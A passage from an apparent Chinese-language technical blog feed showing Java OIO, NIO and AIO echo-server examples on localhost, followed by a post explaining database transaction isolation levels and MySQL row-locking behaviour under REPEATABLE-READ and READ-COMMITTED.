class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OIOEchoServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String host;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> port;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> poolSize;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ExecutorService executor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OIOEchoServer</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(host, port, Runtime.getRuntime().availableProcessors());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OIOEchoServer</span><span class="params">(String host, <span class="type">int</span> port, <span class="type">int</span> poolSize)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        <span class="built_in">this</span>.poolSize = poolSize;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.executor = Executors.newFixedThreadPool(poolSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EchoHandler</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Socket socket;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EchoHandler</span><span class="params">(Socket socket)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.socket = socket;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> socket.getInputStream(); <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> socket.getOutputStream();)&#123;</span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (-<span class="number">1</span> != (read = in.read(buffer))) &#123;</span><br><span class="line">                    out.write(buffer, <span class="number">0</span>, read);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ignored) &#123; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>()) &#123;</span><br><span class="line">            server.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(host, port));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// accept 阻塞 SO_TIMEOUT 2000ms</span></span><br><span class="line">            <span class="comment">//server.setSoTimeout(2000);</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line">                    executor.submit(<span class="keyword">new</span> <span class="title class_">EchoHandler</span>(socket));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SocketTimeoutException ignored) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;timeout&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">OIOEchoServer</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>NIO </p><p>  <img src="/images/nio-selector.png"></p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIOEchoServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String host;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> port;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">shutdown</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NIOEchoServer</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shutdown</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;shutdown&quot;</span>);</span><br><span class="line">        shutdown = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">            <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();) &#123;</span><br><span class="line">            server.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(host, port));</span><br><span class="line">            server.configureBlocking(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第二个参数是感兴趣的事件，默认常量有4个（连接、接受、读、写），</span></span><br><span class="line">            <span class="comment">// 定义在SelectionKey类中，但并不是所有Channel都一定支持，可以用validOps()判断。</span></span><br><span class="line">            <span class="comment">// ServerSocketChannel 默认只支持 &#123;@link SelectionKey#OP_ACCEPT&#125; 事件</span></span><br><span class="line">            server.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 主循环 主循环阻塞会影响后面所有事件</span></span><br><span class="line">            <span class="keyword">while</span> (!shutdown) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().isInterrupted());</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> == selector.select(<span class="number">2000</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// try...catch</span></span><br><span class="line">                Iterator&lt;SelectionKey&gt; keys = selector.selectedKeys().iterator();</span><br><span class="line">                <span class="keyword">while</span> (keys.hasNext()) &#123;</span><br><span class="line">                    <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> keys.next();</span><br><span class="line">                    keys.remove();</span><br><span class="line">                    <span class="keyword">if</span> (!key.isValid()) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 客户端发起连接</span></span><br><span class="line">                    <span class="keyword">if</span> (key.isValid() &amp;&amp; key.isConnectable()) &#123;</span><br><span class="line">                        <span class="comment">//System.out.println(&quot;connect&quot;);</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 服务器接收连接</span></span><br><span class="line">                    <span class="keyword">if</span> (key.isValid() &amp;&amp; key.isAcceptable()) &#123;</span><br><span class="line">                        <span class="comment">//System.out.println(&quot;accept&quot;);</span></span><br><span class="line">                        <span class="type">ServerSocketChannel</span> <span class="variable">serverChannel</span> <span class="operator">=</span> (ServerSocketChannel) key.channel();</span><br><span class="line">                        <span class="type">SocketChannel</span> <span class="variable">socket</span> <span class="operator">=</span> serverChannel.accept();</span><br><span class="line">                        socket.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                        <span class="comment">// 共用同一个selector</span></span><br><span class="line">                        socket.register(selector, SelectionKey.OP_CONNECT | SelectionKey.OP_READ | SelectionKey.OP_WRITE);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (key.isValid() &amp;&amp; key.isReadable()) &#123;</span><br><span class="line">                        <span class="comment">//System.out.println(&quot;read&quot;);</span></span><br><span class="line">                        <span class="type">SocketChannel</span> <span class="variable">socket</span> <span class="operator">=</span> (SocketChannel) key.channel();</span><br><span class="line"></span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">1024</span>);</span><br><span class="line">                        <span class="comment">// 0 or -1</span></span><br><span class="line">                        <span class="keyword">while</span> (socket.read(buffer) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            buffer.flip();</span><br><span class="line">                            <span class="keyword">if</span> (key.isWritable()) socket.write(buffer);</span><br><span class="line">                            buffer.clear();</span><br><span class="line">                        &#125;</span><br><span class="line">                        socket.close();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (key.isValid() &amp;&amp; key.isWritable()) &#123;</span><br><span class="line">                        <span class="comment">//System.out.println(&quot;write&quot;);</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">NIOEchoServer</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>AIO</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIO2EchoServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String host;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NIO2EchoServer</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">AsynchronousChannelGroup</span> <span class="variable">group</span> <span class="operator">=</span> AsynchronousChannelGroup.withThreadPool(Executors.newCachedThreadPool());</span><br><span class="line">            <span class="type">AsynchronousServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> AsynchronousServerSocketChannel.open(group).bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(host, <span class="number">8080</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 复用ServerAcceptCompletionHandler，避免创建过多对象。</span></span><br><span class="line">            <span class="type">ServerAcceptCompletionHandler</span> <span class="variable">serverHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerAcceptCompletionHandler</span>();</span><br><span class="line">            server.accept(server, serverHandler);</span><br><span class="line">            group.awaitTermination(Long.MAX_VALUE, TimeUnit.SECONDS);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClientReadCompletionHandler</span> <span class="keyword">implements</span> <span class="title class_">CompletionHandler</span>&lt;Integer, AsynchronousSocketChannel&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ByteBuffer buffer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ClientReadCompletionHandler</span><span class="params">(<span class="type">int</span> bufferCapacity)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.buffer = ByteBuffer.allocateDirect(bufferCapacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ByteBuffer <span class="title function_">getBuffer</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> buffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer read, <span class="keyword">final</span> AsynchronousSocketChannel socket)</span> &#123;</span><br><span class="line">            buffer.flip();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 错误示例：</span></span><br><span class="line">            <span class="comment">// write 是非阻塞的，我们不能想当然认为后面的buffer.clear后于write执行。</span></span><br><span class="line">            <span class="comment">// 如果先于write执行，那么write时将无数据可写。</span></span><br><span class="line">            <span class="comment">// socket.write(buffer);</span></span><br><span class="line">            <span class="comment">// buffer.clear();</span></span><br><span class="line">            <span class="comment">// socket.read(buffer, socket, this);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// ClientWriteCompletionHandler</span></span><br><span class="line">            socket.write(buffer, socket, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, AsynchronousSocketChannel&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer write, AsynchronousSocketChannel socket)</span> &#123;</span><br><span class="line">                    buffer.clear();</span><br><span class="line">                    socket.read(buffer, socket, ClientReadCompletionHandler.<span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, AsynchronousSocketChannel socket)</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, AsynchronousSocketChannel attachment)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ServerAcceptCompletionHandler</span> <span class="keyword">implements</span> <span class="title class_">CompletionHandler</span>&lt;AsynchronousSocketChannel, AsynchronousServerSocketChannel&gt; &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(AsynchronousSocketChannel socket, AsynchronousServerSocketChannel server)</span> &#123;</span><br><span class="line">            <span class="comment">// 开始监听新的请求，回调处理有ServerCompletionHandler处理</span></span><br><span class="line">            server.accept(server, <span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 开始读数据，读到的数据有ClientCompletionHandler处理</span></span><br><span class="line">            <span class="type">ClientReadCompletionHandler</span> <span class="variable">clientHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClientReadCompletionHandler</span>(<span class="number">3</span>);</span><br><span class="line">            socket.read(clientHandler.getBuffer(), socket, clientHandler);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, AsynchronousServerSocketChannel server)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">NIO2EchoServer</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Netty </p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    </span><br></pre></td></tr></table></figure></li></ul><p>Mina、Netty、Grizzly</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>事物隔离级别</title>
      <link href="/post/transaction-isolation.html"/>
      <url>/post/transaction-isolation.html</url>
      
        <content type="html"><![CDATA[<h2 id="事物隔离级别"><a href="#事物隔离级别" class="headerlink" title="事物隔离级别"></a>事物隔离级别</h2><p>事物的隔离级别是数据库处理的基础之一。隔离级别就是<code>ACID</code>缩写中的<code>I</code>。隔离级别的微调在性能和可靠性以及在多个事物同时修改或查询时结果一致性和重复性方面获得一个平衡。</p><table><thead><tr><th>隔离级别</th><th align="center">脏读（Dirty Read）</th><th align="center">不可重复读（NonRepeatable Read）</th><th align="center">幻读（Phantom Read）</th></tr></thead><tbody><tr><td>READ-UNCOMMITTED</td><td align="center">可能</td><td align="center">可能</td><td align="center">可能</td></tr><tr><td>READ-COMMITTED</td><td align="center">不可能</td><td align="center">可能</td><td align="center">可能</td></tr><tr><td>REPEATABLE-READ</td><td align="center">不可能</td><td align="center">不可能</td><td align="center">可能</td></tr><tr><td>SERIALIZABLE</td><td align="center">不可能</td><td align="center">不可能</td><td align="center">不可能</td></tr></tbody></table><h3 id="数据库事务特性（ACID）"><a href="#数据库事务特性（ACID）" class="headerlink" title="数据库事务特性（ACID）"></a>数据库事务特性（ACID）</h3><ul><li><p>原子性（Atomicity）</p><p>  事务作为一个整体被执行，包含在其中的对数据库的操作要么全部被执行，要么都不执行。</p></li><li><p>一致性（Consistency）</p><p>  事务应确保数据库的状态从一个一致状态转变为另一个一致状态。一致状态的含义是数据库中的数据应满足完整性约束。</p></li><li><p>隔离性（Isolation）：</p><p>  多个事务并发执行时，一个事务的执行不应影响其他事务的执行。</p></li><li><p>持久性（Durability）：</p><p>  已被提交的事务对数据库的修改应该永久保存在数据库中。</p></li></ul><h3 id="MySQL-中的事物隔离级别"><a href="#MySQL-中的事物隔离级别" class="headerlink" title="MySQL 中的事物隔离级别"></a>MySQL 中的事物隔离级别</h3><p>MySQL中默认的事物隔离界别是<code>REPEATABLE-READ</code>，四种隔离界中我们常用的还有<code>READ-COMMITTED</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> t <span class="keyword">where</span> t.id <span class="operator">=</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>索引情况</th><th>REPEATABLE-READ</th><th>READ-COMMITTED</th></tr></thead><tbody><tr><td>ID主键</td><td>匹配记录X锁</td><td>匹配记录X锁</td></tr><tr><td>ID唯一索引</td><td>索引对应的记录加X锁，聚簇索引上对应的记录加X锁</td><td>索引对应的记录加X锁，聚簇索引上对应的记录加X锁</td></tr><tr><td>ID非唯一索引</td><td>索引对应的记录加X锁，聚簇索引对应的记录加X锁，索引间隙加间隙锁（包括两端）</td><td>索引对应的记录都加X锁，聚簇索引对应的记录都加X锁</td></tr><tr><td>无索引</td><td>所有记录加X锁，聚簇索引所有间隙加间隙锁</td><td>聚簇索引上所有记录加X锁（MySQL Server层面会进行过滤，提前释放掉不符合条件的记录X锁）</td></tr></tbody></table><p>下面的例子我们将讲一下两者的区别。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> t (a <span class="type">INT</span> <span class="keyword">NOT NULL</span>, b <span class="type">INT</span>) ENGINE <span class="operator">=</span> InnoDB;</span><br><span class="line"><span class="keyword">INSERT INTO</span> t <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="number">2</span>),(<span class="number">2</span>,<span class="number">3</span>),(<span class="number">3</span>,<span class="number">2</span>),(<span class="number">4</span>,<span class="number">3</span>),(<span class="number">5</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><p>我们执行一条更新语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Session A</span><br><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"><span class="keyword">UPDATE</span> t <span class="keyword">SET</span> b <span class="operator">=</span> <span class="number">5</span> <span class="keyword">WHERE</span> b <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>紧接着执行第二条更新语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Session B</span><br><span class="line"><span class="keyword">UPDATE</span> t <span class="keyword">SET</span> b <span class="operator">=</span> <span class="number">4</span> <span class="keyword">WHERE</span> b <span class="operator">=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>当隔离级别是<code>REPEATABLE-READ</code>时，第一条语句会首先获取所有行的<code>x-lock</code>，并一直持有。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x-lock(1,2); retain x-lock</span><br><span class="line">x-lock(2,3); update(2,3) to (2,5); retain x-lock</span><br><span class="line">x-lock(3,2); retain x-lock</span><br><span class="line">x-lock(4,3); update(4,3) to (4,5); retain x-lock</span><br><span class="line">x-lock(5,2); retain x-lock</span><br></pre></td></tr></table></figure><p>此时第二条语句回去尝试获得锁，直到第一条语句提交释放锁。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-lock(1,2); block and wait for first UPDATE to commit or roll back</span><br></pre></td></tr></table></figure><p>如果这个隔离级别是<code>READ-COMMITTED</code>，情况会有所不同。首先第一条语句同样会获取所有行的<code>x-lock</code>，然后它会去检查<code>where</code>条件，如果不匹配会立即释放掉这条记录的<code>x-lock</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x-lock(1,2); unlock(1,2) releases those for rows that it does not modify</span><br><span class="line">x-lock(2,3); update(2,3) to (2,5); retain x-lock</span><br><span class="line">x-lock(3,2); unlock(3,2)</span><br><span class="line">x-lock(4,3); update(4,3) to (4,5); retain x-lock</span><br><span class="line">x-lock(5,2); unlock(5,2)</span><br></pre></td></tr></table></figure><p>第二条查询语句会先读取每条记录的一个最新的快照，然后去检查<code>where</code>条件是否匹配。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x-lock(1,2); update(1,2) to (1,4); retain x-lock</span><br><span class="line">x-lock(2,3); unlock(2,3)</span><br><span class="line">x-lock(3,2); update(3,2) to (3,4); retain x-lock</span><br><span class="line">x-lock(4,3); unlock(4,3)</span><br><span class="line">x-lock(5,2); update(5,2) to (5,4); retain x-lock</span><br></pre></td></tr></table></figure><h3 id="死锁示例"><a href="#死锁示例" class="headerlink" title="死锁示例"></a>死锁示例</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create table</span> question (</span><br><span class="line">id <span class="type">int</span> <span class="keyword">not null</span> auto_increment,</span><br><span class="line">source <span class="type">varchar</span>(<span class="number">20</span>), </span><br><span class="line">sid <span class="type">int</span>,</span><br><span class="line">create_at <span class="type">bigint</span>,</span><br><span class="line"><span class="keyword">primary key</span> (`id`),</span><br><span class="line">KEY 